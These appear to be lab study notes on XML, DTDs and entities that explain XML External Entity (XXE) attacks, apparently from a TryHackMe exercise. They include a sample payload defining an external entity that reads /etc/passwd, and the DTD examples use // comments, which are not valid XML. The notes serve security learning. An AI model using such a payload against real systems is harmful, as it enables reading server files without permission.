# XML

`XML` is used to transport and store data in a readable form (for both humans and computers). `XML` uses tags to label and organize information. `XML` allows you to store data within the tags.

```xml
<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

## DTD (Document Type Definition)

Once two computers decide on the data format, `DTD` comes into play as the set of rules that defines the structure of a `XML` document. `DTD` is like a blueprint telling you what elements (tags) and attributes are allowed in the `XML` file.

```xml
<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>            // parsed people data
   <!ELEMENT address (#PCDATA)>         // parsed people data
   <!ELEMENT email (#PCDATA)>           // parsed people data
   <!ELEMENT phone (#PCDATA)>           // parsed people data
]>
```

## Entities in XML

`Entities` are like placeholders that allow for plugging in data or referencing external files.

```xml
<!DOCTYPE people [
   <!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">   // ext file located at url
]>
<people>
   <name>Glitch</name>
   <address>&ext;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
```

## XML External Entity (XXE)

`XXE` is an attack that takes advantage of how XML parsers handle external entities. When a web app processes `XML`, the parser attempts to load/execute whatever the resources point to. If sanitation is not in place, you can point the entity to any malicious source/code for the app to execute.

```xml
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   //...
</people>
```

In this example, the parser will try to load and display the contents of the `/etc/passwd` file.

## Intercepting a XML Request

`Burp Suite` (web vulnerability scanner), can be used to intercept and modify requests.
